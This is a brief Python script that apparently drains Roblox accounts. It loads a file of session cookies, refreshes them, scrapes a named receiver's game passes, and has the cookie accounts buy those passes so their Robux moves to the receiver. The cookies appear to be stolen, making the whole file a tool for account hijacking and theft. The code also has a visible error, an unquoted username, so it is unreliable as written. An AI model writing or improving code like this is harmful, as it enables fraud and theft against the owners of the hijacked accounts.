


cookieClass = cookie.refresh()

robux_receiver_user = Althegreat_1
gameClass = experiences.scrape(robux_receiver_user)

async def main():
    refreshed_cookies = await cookieClass.run(open("cookies.txt", "r").read().split("\n"))
    if not refreshed_cookies[1]:
        raise Exception("Failed to refresh cookies: received an empty list: {}".format(refreshed_cookies[0]))
    
    gamepasses = await gameClass.run()
    
    if not gamepasses["success"] or not gamepasses["game_passes"]:
        raise Exception("Failed to scrape user gamepasses")
    
    productsClass = products.products(products=gamepasses["game_passes"], cookies=refreshed_cookies[1])
    rbx_spend = await productsClass.run()
    
    print(f"Total robux transfered: {rbx_spend}")

asyncio.run(main())
